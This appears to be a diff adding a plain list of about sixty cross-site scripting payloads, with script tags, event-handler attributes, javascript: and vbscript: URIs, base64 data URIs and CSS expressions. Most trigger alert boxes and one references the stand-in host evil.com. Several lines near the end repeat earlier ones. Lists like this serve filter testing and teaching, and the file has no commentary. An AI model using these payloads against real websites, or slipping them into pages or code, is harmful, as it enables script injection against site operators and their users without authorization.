@@ -1,0 +1,58 @@
+<script>alert(1)</script>
+<img src="x" onerror="alert('XSS')">
+<svg onload="alert('XSS')">
+<body onload="alert('XSS')">
+<iframe src="javascript:alert('XSS')"></iframe>
+<input type="text" value="<script>alert('XSS');</script>">
+<div onmouseover="alert('XSS')">hover me</div>
+<a href="javascript:alert('XSS')">click me</a>
+<form action="javascript:alert('XSS')"><input type="submit"></form>
+<marquee onstart="alert('XSS')">marquee text</marquee>
+<object data="javascript:alert('XSS')"></object>
+<embed src="javascript:alert('XSS')"></embed>
+<bgsound src="javascript:alert('XSS')">
+<isindex action="javascript:alert('XSS')">
+<base href="javascript:alert('XSS')//">
+<link rel="stylesheet" href="javascript:alert('XSS')">
+<table background="javascript:alert('XSS')">
+<td background="javascript:alert('XSS')">
+<div style="background-image: url(javascript:alert('XSS'))">div text</div>
+<img dynsrc="javascript:alert('XSS')">
+<img lowsrc="javascript:alert('XSS')">
+<br size="&{alert('XSS')}">
+<layer src="javascript:alert('XSS')"></layer>
+<xml id="xss"><a><b><img src="javascript:alert('XSS')"></b></a></xml>
+<style>@import "javascript:alert('XSS')";</style>
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS');">
+<base href="javascript:alert('XSS')"><a href="/">test</a>
+<div style="width: expression(alert('XSS'));">test</div>
+<img src=`javascript:alert('XSS')`>
+<embed src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+"></embed>
+<script src="data:text/javascript;base64,YWxlcnQoMSk+PC9zY3JpcHQ+"></script>
+<iframe srcdoc="&lt;script&gt;alert('XSS')&lt;/script&gt;"></iframe>
+<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/"></object>
+<form><button formaction="javascript:alert('XSS')">X</button></form>
+<math><a xlink:href="javascript:alert('XSS')">click</a></math>
+<svg><desc><![CDATA[<script>alert('XSS')</script>]]></desc></svg>
+<audio src="x" onerror="alert('XSS')">
+<video src="x" onerror="alert('XSS')">
+<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+">
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA"></img>
+<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"></img>
+<img src="data:text/html,<script>alert('XSS')</script>">
+<input type="text" value="<img src=x onerror=alert('XSS')>">
+<div onmouseover="javascript:alert('XSS')">hover me</div>
+<button onclick="alert('XSS')">click me</button>
+<meta charset="utf-8"><body onload=alert('XSS')></body>
+<img src="http://evil.com/xss.jpg">
+<img src="javascript:alert('XSS')">
+<img src="vbscript:msgbox('XSS')">
+<div onmouseover="alert('XSS')">hover me</div>
+<a href="javascript:alert('XSS')">click me</a>
+<script>alert("XSS");</script>
+<input type="text" value="<script>alert('XSS');</script>">
+<div onmouseover="javascript:alert('XSS')">hover me</div>
+<button onclick="alert('XSS')">click me</button>
+<meta charset="utf-8"><body onload=alert('XSS')></body>
+<img src="javascript:alert('XSS')">
+<img src="vbscript:msgbox('XSS')">
